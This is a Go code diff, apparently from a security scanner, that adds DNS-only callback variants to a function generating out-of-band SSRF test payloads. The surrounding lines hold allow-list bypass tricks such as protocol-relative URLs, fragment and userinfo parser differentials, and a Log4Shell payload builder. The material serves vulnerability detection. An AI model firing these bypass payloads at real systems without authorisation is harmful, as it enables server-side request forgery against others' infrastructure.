@@ -67,7 +67,11 @@ func log4ShellParamPayloads(cb string) []string {
 // direct callback plus the scheme/encoding variants a naive allow-list or
 // "must-start-with-https" filter still lets through. All share one token, so any
 // single callback attributes to this injection point. host is bare host[:port].
-func ssrfOOBPayloads(cb, host, original string) []string {
+// dnsHost, when set, is the token-bearing <token>.<zone> our authoritative DNS
+// listener answers for: a request to http://<dnsHost>/ resolves that name first,
+// so even a target that can resolve DNS but cannot complete an outbound HTTP
+// connection to us still produces a caught, attributable DNS callback.
+func ssrfOOBPayloads(cb, host, original, dnsHost string) []string {
 	path := ""
 	if callback, err := url.Parse(cb); err == nil {
 		path = callback.EscapedPath()
@@ -80,6 +84,12 @@ func ssrfOOBPayloads(cb, host, original string) []string {
 		"https://" + host + path, // https variant
 		"//" + host + path,       // protocol-relative
 		cb + "#",                 // trailing-fragment filter bypass
+	}
+	if dnsHost != "" {
+		out = append(out,
+			"http://"+dnsHost+"/",  // DNS-only egress: lookup of <token>.<zone> is caught
+			"https://"+dnsHost+"/", // https over the DNS-catchable host
+		)
 	}
 	// Whitelist parser differentials: if discovery captured an originally allowed
 	// URL, keep its host in userinfo/fragment positions while the network client
